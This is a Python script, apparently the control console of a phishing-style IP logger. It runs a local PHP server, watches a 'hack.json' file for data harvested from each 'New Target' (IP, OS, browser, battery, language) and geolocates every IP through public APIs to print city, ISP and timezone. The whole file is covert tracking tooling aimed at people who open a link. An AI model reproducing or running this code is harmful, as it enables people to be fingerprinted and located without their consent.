import json
import requests
import os
from pyngrok import ngrok
from colorama import Fore , init
import subprocess
init()
stat_file_logs = 0

def master():
        import sys
        global stat_file_logs
        def server():
            os.chdir('IP')
            with open('ip.log' , 'w') as file:
                subprocess.Popen(('php' , '-S' , 'localhost:3030'),stderr=file , stdout=file)
                print(Fore.GREEN+'''
                    RUN SERVER PORT 3030 
                    your privit link : http://localhost:3030
                    ''')
        server()
        try:
            global stat_file_logs
            while True:
                import time
                a = time.localtime()
                ba = a.tm_hour , ":" , a.tm_min , ":" , a.tm_sec
                BBlack = "\033[1;30m"  # Black
                BRed = "\033[1;31m"  # Red
                BGreen = "\033[1;32m"  # Green
                BYellow = "\033[1;33m"  # Yellow
                BBlue = "\033[1;34m"  # Blue
                BPurple = "\033[1;35m"  # Purple
                BCyan = "\033[1;36m"  # Cyan
                BWhite = "\033[1;37m"  # White
                if not str(os.stat("hack.json").st_size) == stat_file_logs:
                    stat_file_logs = str(os.stat("hack.json").st_size)
                    file_ip = open("hack.json", 'r')
                    i = file_ip.readlines()
                    try:
                        i = i[-1]
                        i = i.strip()
                        file = open('hack.json', 'r')
                        info = json.load(file)
                        print(f'''
        ====================================================================
        {BWhite}New Target
        ====================================================================
                        ''')
                        print(a.tm_hour,":",a.tm_min,":",a.tm_sec)
                        print(f"\n{BRed}ip : "+info['Os-Ip'] + "        ")
                        print(f"\n{BGreen}Os_name : "+info['Os-Name'] + "        ")
                        print(f"\n{BPurple}Browser-Name : "+info['Browser-Name'] + "        ")
                        print(f"\n{BCyan}CPU-Architecture : " + info['CPU-Architecture'] +"        ")
                        print(f"\n{BBlue}batry : "+info['batry'] + "        ")
                        print(f"\n{BGreen}user : "+info['user'] + "        ")
                        print(f"\n{BRed}Language : " + info['Language'] + "        ")
                        req0 = (f"https://ipapi.co/"+info['Os-Ip']+"/json/")
                        req = requests.get(req0).text
                        info_ip = json.loads(req)
                        req1 = requests.get(f"http://ip-api.com/json/"+info['Os-Ip']).text
                        inf_ip2 = json.loads(req1)
                        print(f"\n{BCyan}city >> " + info_ip['city'] + "         ")
                        print(f"\n{BWhite}region >> " + info_ip['region'] +"         ")
                        print(f"\n{BYellow}version ip >> " + info_ip['version'] +"       ")
                        print(f"\n{BRed}country ip >> " + info_ip['country'] +"       ")
                        print(f"\n{BPurple}country_name >> " +info_ip['country_name'] + "         ")
                        print(f"\n{BGreen}country_capital  >> " +info_ip['country_capital'] + "         ")
                        print(f"\n{BWhite}languages >> " + info_ip['languages'] +"         ")
                        print(f"\n{BBlue}ncountry_calling_code >> " +info_ip['country_calling_code'] + "       ")
                        print(f"\n{BRed}org >> " + info_ip['org'] + "         ")
                        print(f"\n{BPurple}timezone >> " + inf_ip2['timezone'] + "         ")
                        print(f"\n{BRed}isp >> " + inf_ip2['isp'] +"         ")
                        print(f"\n{BCyan}status >> " + inf_ip2['status'] +"         ")
                        o = open("hack.json", "w")
                        o.write("")
                        o.close()
                    except:
                        print("")
        except KeyboardInterrupt:
            sys.exit()

            


            




master()